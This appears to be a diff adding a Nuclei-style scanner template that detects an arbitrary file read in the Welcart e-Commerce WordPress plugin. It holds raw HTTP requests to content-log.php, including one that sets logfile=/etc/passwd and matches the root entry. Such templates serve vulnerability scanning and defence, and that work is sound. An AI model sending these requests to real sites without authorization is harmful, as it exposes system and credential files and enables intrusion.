@@ -1,0 +1,40 @@
+id: wordpress-welcart-ecommerce-file-read
+info:
+  name: WordPress plugin Welcart e-Commerce content-log.php logfile File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Welcart is a free e-commerce plugin for WordPress with top market share in Japan. An arbitrary file read vulnerability exists in Welcart e-Commerce < 2.8.5, allowing attackers to obtain sensitive files.
+  reference:
+    - https://wpscan.com/vulnerability/0d649a7e-3334-48f7-abca-fff0856e12c7
+  classification:
+    cvss-score: 9.8
+  tags: file-read
+  metadata:
+    product: WordPress-Welcart-e-Commerce
+http:
+  - raw:
+      - |
+        GET /wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=content-log.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "rawurldecode"
+          - "file_get_contents"
+  - raw:
+      - |
+        GET /wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
